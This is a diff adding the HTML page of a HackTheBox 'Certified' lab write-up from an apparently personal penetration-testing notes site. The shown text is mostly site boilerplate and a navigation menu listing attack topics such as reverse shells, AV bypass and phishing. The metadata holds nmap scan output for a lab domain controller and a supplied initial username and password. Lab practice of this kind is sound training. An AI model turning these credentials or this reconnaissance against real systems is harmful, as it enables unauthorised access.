@@ -1,0 +1,1683 @@
+<!doctype html>
+<html lang="en" data-bs-theme="auto">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><link rel="preload" href="http://localhost:1313/fonts/vendor/jost/jost-v4-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="http://localhost:1313/fonts/vendor/jost/jost-v4-latin-500.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="http://localhost:1313/fonts/vendor/jost/jost-v4-latin-700.woff2" as="font" type="font/woff2" crossorigin>
+<script 
+  src="/js/color-mode.f14b3e296de1d0b69e75af684b62a4a912a2cadab04e36123407cd8388204f1d.js"
+  integrity="sha256-8Us&#43;KW3h0Laeda9oS2KkqRKiytqwTjYSNAfNg4ggTx0=">
+</script>
+
+
+<link rel="stylesheet" href="/main.1542a5884e04a94d737f95f75653bbae5d9d951aeefab7705a9db5f7a85e58fed8b1c2f686c1303120bb66c4ac2cbfbf1317d05cde7d463eccc899dbb8088787.css" integrity="sha512-FUKliE4EqU1zf5X3VlO7rl2dlRru&#43;rdwWp2196heWP7YscL2hsEwMSC7ZsSsLL&#43;/ExfQXN59Rj7MyJnbuAiHhw==" crossorigin="anonymous">
+
+<noscript><style>img.lazyload { display: none; }</style></noscript><base href="http://localhost:1313/notes/6-lab/htb/certified/">
+
+  <link rel="canonical" href="http://localhost:1313/notes/6-lab/htb/certified/">
+
+
+<title>Certified  |  P4V1C</title>
+<meta name="description" content="">
+
+    
+    <link rel="icon" href="/favicon.ico" sizes="32x32">
+    
+      <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+    
+      <link
+        rel="apple-touch-icon"
+        href="/apple-touch-icon.png"
+        sizes="180x180"
+        type="image/png"
+      >
+      <link
+        rel="icon"
+        href="/favicon-192x192.png"
+        sizes="192x192"
+        type="image/png"
+      >
+      <link
+        rel="icon"
+        href="/favicon-512x512.png"
+        sizes="512x512"
+        type="image/png"
+      >
+<link rel="manifest" href="/manifest.webmanifest">
+
+<meta property="og:url" content="http://localhost:1313/notes/6-lab/htb/certified/">
+  <meta property="og:site_name" content="P4V1C">
+  <meta property="og:title" content="Certified">
+  <meta property="og:description" content="#Shadow_credential Target : 10.10.11.41
+Scan :
+PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36 |_ssl-date: 2024-11-24T16:20:06&#43;00:00; &#43;7h00m00s from scanner time. 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36Initial credential : judith.mader : judith09">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="notes">
+    <meta property="article:published_time" content="2023-09-07T16:06:50+02:00">
+    <meta property="article:modified_time" content="2023-09-07T16:06:50+02:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Certified">
+  <meta name="twitter:description" content="#Shadow_credential Target : 10.10.11.41
+Scan :
+PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36 |_ssl-date: 2024-11-24T16:20:06&#43;00:00; &#43;7h00m00s from scanner time. 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36Initial credential : judith.mader : judith09">
+      <meta name="twitter:site" content="@getdoks">
+
+    
+    
+    
+    <script type="application/ld+json">
+  {
+   "@context": "https://schema.org",
+   "@type": "BreadcrumbList",
+   "itemListElement": [
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/",
+       "name": "About Me",
+       "position": 1
+     },
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/notes/",
+       "name": "Notes",
+       "position": 2
+     },
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/notes/6-lab/",
+       "name": "Labs",
+       "position": 3
+     },
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/notes/6-lab/htb/",
+       "name": "Htb",
+       "position": 4
+     },
+     {
+       "@type": "ListItem",
+       "name": "Certified",
+       "position": 5
+     }
+   ]
+ }
+</script>
+
+
+
+
+
+</head>
+
+  
+  <body class="single section notes" data-bs-spy="scroll" data-bs-target="#toc" data-bs-root-margin="0px 0px -60%" data-bs-smooth-scroll="true" tabindex="0">
+    <div class="sticky-top">
+<header class="navbar navbar-expand-lg">
+  <div class="container-lg">
+  
+    <a class="navbar-brand me-auto me-lg-3" href="/">P4V1C</a>
+
+    
+    
+    <button type="button" id="searchToggleMobile" class="btn btn-link nav-link mx-2 d-lg-none" aria-label="Search website">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+        <circle cx="10" cy="10" r="7"></circle>
+        <line x1="21" y1="21" x2="15" y2="15"></line>
+      </svg>
+    </button>
+    
+    <button class="btn btn-link d-lg-none" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavSection" aria-controls="offcanvasNavSection" aria-label="Open section navigation menu">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-dots-vertical" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+        <path d="M12 12m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0"></path>
+        <path d="M12 19m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0"></path>
+        <path d="M12 5m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0"></path>
+      </svg>
+    </button>
+    <div class="offcanvas offcanvas-start d-lg-none" tabindex="-1" id="offcanvasNavSection" aria-labelledby="offcanvasNavSectionLabel">
+      <div class="offcanvas-header">
+        <h5 class="offcanvas-title" id="offcanvasNavSectionLabel">Notes</h5>
+        <button type="button" class="btn btn-link nav-link p-0 ms-auto" data-bs-dismiss="offcanvas" aria-label="Close">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M18 6l-12 12"></path>
+            <path d="M6 6l12 12"></path>
+          </svg>
+        </button>
+      </div>
+      <div class="offcanvas-body">
+        <aside class="doks-sidebar mt-n3">
+          <nav id="doks-docs-nav" aria-label="Tertiary navigation">
+            
+  
+    
+<nav class="section-nav docs-links">
+  <ul class="list-unstyled">
+
+  <li>
+    <details>
+      <summary>AD</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+    <details>
+      <summary>Local Privilege escalation</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ad/local-privilege-escalation/linux-privesc/">Linux Privesc</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/local-privilege-escalation/windows-privesc/">windows-privesc</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Tools</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ad/tools/bloodhound/">Bloodhound</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/evil-winrm/">Evil WinRm</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/firewall-evasion/">Firewall Evasion</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/impacket/">Impacket</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/netexec/">Netexec</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/powerview/">Powerview</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+      <a href="/notes/ad/ad-cs/">AD CS</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/av-amsi-bypass/">AV &amp; AMSI Bypass</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/c2/">C2</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/delegation/">Delegation</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/discovery/">Discovery</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/hash-stealing/">Hash stealing</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/kerberoast-asreproast/">Kerberoast-Asreproast</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/krbrelaiup/">KrbRelaiUp</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/linux/">Linux</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/ntlm-relay/">Ntlm Relay</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/password-looting/">Password looting</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/phishing/">Phishing</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/pivot/">Pivot</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tickets/">Tickets</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/transfert/">Transfert</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/trust-attack/">Trust Attack</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Reverse Shell</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/shell-and-payload/bash/">Bash</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/msfvenom/">MsfVenom</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/netcat/">Netcat</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/nodejs/">Nodejs</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/php-monkey/">Php-Monkey</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/powershell/">Powershell</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/pownyshell/">PownyShell</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/python/">Python</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/upgrade/">Upgrade</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>Crypto</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/5-crypto/maths/">Maths</a>
+  </li>
+
+  <li>
+      <a href="/notes/5-crypto/scripting/">Scripting</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>Dev</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/code/bash/">Bash</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/c/">C</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/c-/">C&#43;&#43;</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/go/">Go</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/java/">Java</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/lua/">Lua</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/nodejs/">Nodejs</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/php/">Php</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/ruby/">Ruby</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open open>
+      <summary>Labs</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+    <details open open>
+      <summary>HTB</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/6-lab/htb/analysis/">Analysis</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/htb/caption/">Caption</a>
+  </li>
+
+  <li class="active" >
+      <a aria-current="page" href="/notes/6-lab/htb/certified/">Certified</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/htb/cicada/">Cicada</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/htb/hospital/">Hospital</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/htb/infiltrator/">Infiltrator</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/htb/perfection/">Perfection</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/htb/pov/">POV</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>Vulnlab</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/baby/">Baby</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/baby2/">Baby2</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/breach/">Breach</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/bruno/">Bruno</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/build/">Build</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/data/">Data</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/delegate/">Delegate</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/escape/">Escape</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/feedback/">Feedback</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/forgotten/">Forgotten</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/heron/">Heron</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/hybrid/">Hybrid</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/lock/">Lock</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/media/">Media</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/reflection/">Reflection</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/retro/">Retro</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/sendai/">Sendai</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/sync/">Sync</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/tea/">Tea</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/tengu/">Tengu</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/trusted/">Trusted</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>Pwn-Reverse</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/pwn-reverse/android-emulation/">Android Emulation</a>
+  </li>
+
+  <li>
+    <details open>
+      <summary>CTf</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/introduction-to-the-geomyides/">Introduction to the Geomyides</a>
+  </li>
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/keygen-me/">Keygen-Me</a>
+  </li>
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/simple-encryptor/">Simple Encryptor</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>Ressources</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ressources/arch-setup/">Arch-Setup</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/command-linux/">Command Linux</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/debian-setup/">Debian-Setup</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/kvm/">Kvm</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/link/">Link</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/tmux/">Tmux</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>Services</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/4-services/ftp/">FTP</a>
+  </li>
+
+  <li>
+      <a href="/notes/4-services/iis/">IIS</a>
+  </li>
+
+  <li>
+      <a href="/notes/4-services/ldap/">Ldap</a>
+  </li>
+
+  <li>
+      <a href="/notes/4-services/mssql-mysql/">Mssql-Mysql</a>
+  </li>
+
+  <li>
+      <a href="/notes/4-services/rpcbind/">RPCbind</a>
+  </li>
+
+  <li>
+      <a href="/notes/4-services/rsync/">Rsync</a>
+  </li>
+
+  <li>
+      <a href="/notes/4-services/rtsp/">RTSP</a>
+  </li>
+
+  <li>
+      <a href="/notes/4-services/smtp/">SMTP</a>
+  </li>
+
+  <li>
+      <a href="/notes/4-services/snmp/">SNMP</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>Webs</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/web/access-control/">Access Control</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/api-testing/">API Testing</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/authentication/">Authentication</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/command-injection/">Command Injection</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/deserialization/">Deserialization</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/file-upload/">File Upload</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/git/">Git</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/graphsql/">Graphsql</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/jwt/">JWT</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/path-traversal/">Path Traversal</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/race-conditon/">Race Conditon</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/ssrf/">SSRF</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/web-cache/">Web Cache</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/wordpress/">Wordpress</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/xss/">XSS</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/xxe/">XXE</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+  </ul>
+</nav>
+
+  
+
+          </nav>
+        </aside>
+      </div>
+    </div>
+    
+    <button class="btn btn-link nav-link mx-2 order-3 d-lg-none" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavMain" aria-controls="offcanvasNavMain" aria-label="Open main navigation menu">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+        <line x1="4" y1="8" x2="20" y2="8"></line>
+        <line x1="4" y1="16" x2="20" y2="16"></line>
+      </svg>
+    </button>
+
+    
+    <div class="offcanvas offcanvas-end h-auto" tabindex="-1" id="offcanvasNavMain" aria-labelledby="offcanvasNavMainLabel">
+      <div class="offcanvas-header">
+        <h5 class="offcanvas-title" id="offcanvasNavMainLabel">P4V1C</h5>
+        <button type="button" class="btn btn-link nav-link p-0 ms-auto" data-bs-dismiss="offcanvas" aria-label="Close">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M18 6l-12 12"></path>
+            <path d="M6 6l12 12"></path>
+         </svg>
+        </button>
+      </div>
+      
+      <div class="offcanvas-body d-flex flex-column flex-lg-row justify-content-between">
+        <ul class="navbar-nav flex-grow-1"><li class="nav-item">
+                <a class="nav-link active" href="http://localhost:1313/notes/ad/ad-cs" aria-current="true">Notes</a>
+              </li>
+            <li class="nav-item">
+                <a class="nav-link" href="http://localhost:1313/blog/">Blog</a>
+              </li>
+            </ul>
+
+        
+        
+        <button type="button" id="searchToggleDesktop" class="btn btn-link nav-link p-2 d-none d-lg-block" aria-label="Search website">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <circle cx="10" cy="10" r="7"></circle>
+            <line x1="21" y1="21" x2="15" y2="15"></line>
+          </svg>
+        </button>
+        
+        
+        
+        <button id="buttonColorMode" class="btn btn-link mx-auto nav-link p-0 ms-lg-2 me-lg-1" type="button" aria-label="Toggle theme">
+          <svg data-bs-theme-value="dark" xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-moon" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z"></path>
+          </svg>
+          <svg data-bs-theme-value="light" xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-sun" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M12 12m-4 0a4 4 0 1 0 8 0a4 4 0 1 0 -8 0m-5 0h1m8 -9v1m8 8h1m-9 8v1m-6.4 -15.4l.7 .7m12.1 -.7l-.7 .7m0 11.4l.7 .7m-12.1 -.7l-.7 .7"></path>
+          </svg>
+        </button>
+        
+        <ul id="socialMenu" class="nav mx-auto flex-row order-lg-4">
+          <li class="nav-item">
+              <a class="nav-link social-link" href="https://github.com/thuliteio/doks"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"></path><path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"></path></svg><small class="ms-2 visually-hidden">GitHub</small></a>
+            </li>
+          </ul>
+        
+        </div>
+    </div>
+
+    
+    </div>
+</header>
+</div>
+
+<div class="modal" id="searchModal" tabindex="-1" aria-labelledby="searchModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-fullscreen-md-down">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h1 class="modal-title fs-5 visually-hidden" id="searchModalLabel">Search</h1>
+        <button type="button" class="btn-close visually-hidden" data-bs-dismiss="modal" aria-label="Close"></button>
+        <div class="search-input flex-grow-1 d-none">
+          <form id="search-form" class="search-form" action="#" method="post" accept-charset="UTF-8" role="search">
+            <label for="query" class="visually-hidden">Search</label>
+            <div class="d-flex">
+              <input type="search" id="query" name="query" class="search-text form-control form-control-lg" placeholder="Search" aria-label="Search" maxlength="128" autocomplete="off">
+              <button type="button" class="btn btn-link text-decoration-none px-0 ms-3 d-md-none" data-bs-dismiss="modal" aria-label="Close">Cancel</button>
+            </div>
+          </form>
+        </div>
+      </div>
+      <div class="modal-body">
+        <p class="search-loading status message d-none mt-3 text-center">Loading search index…</p>
+        <p class="search-no-recent message d-none mt-3 text-center">No recent searches</p>
+        <p class="search-no-results message d-none mt-3 text-center">No results for "<strong><span class="query-no-results">Query here</span></strong>"</p>
+        <div id="searchResults" class="search-results"></div>
+        <template>
+          <article class="search-result list-view">
+            <div class="card my-3">
+              <div class="card-body">
+                <header>
+                  <h2 class="h5 title title-submitted mb-0"><a class="stretched-link text-decoration-none text-reset" href="#">Title here</a></h2>
+                  <div class="submitted d-none"><time class="created-date">Date here</time></div>
+                </header>
+                <div class="content">Summary here</div>
+              </div>
+            </div>
+          </article>
+        </template>
+      </div>
+      <div class="modal-footer">
+        <ul class="list-inline me-auto d-none d-md-block">
+          <li class="list-inline-item"><kbd class="me-2"><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4M7 11.53088l-3-3 3-3"></path></g></svg></kbd><span class="DocSearch-Label">to select</span></li>
+          <li class="list-inline-item"><kbd class="me-2"><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8M10.5 8.5l-3 3-3-3"></path></g></svg></kbd><kbd class="me-2"><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8M10.5 6.5l-3-3-3 3"></path></g></svg></kbd><span class="DocSearch-Label">to navigate</span></li>
+          <li class="list-inline-item"><kbd class="me-2"><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993 0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016.8634 0 1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5c.032.5663-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864 0 1.6425 1.031 1.5443 2.2492h-2.956"></path></g></svg></kbd><span class="DocSearch-Label">to close</span></li>
+        </ul>
+        <p class="d-md-none">Search by <a class="text-decoration-none" href="https://github.com/nextapps-de/flexsearch">FlexSearch</a></p>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+    <div class="wrap container-lg" role="document">
+      <div class="content">
+      
+        
+	<div class="row flex-xl-nowrap">
+		<div class="col-lg-5 col-xl-4 docs-sidebar d-none d-lg-block">
+			
+  
+    
+<nav class="section-nav docs-links">
+  <ul class="list-unstyled">
+
+  <li>
+    <details>
+      <summary>AD</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+    <details>
+      <summary>Local Privilege escalation</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ad/local-privilege-escalation/linux-privesc/">Linux Privesc</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/local-privilege-escalation/windows-privesc/">windows-privesc</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Tools</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ad/tools/bloodhound/">Bloodhound</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/evil-winrm/">Evil WinRm</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/firewall-evasion/">Firewall Evasion</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/impacket/">Impacket</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/netexec/">Netexec</a>
+  </li>
+
+  <li>
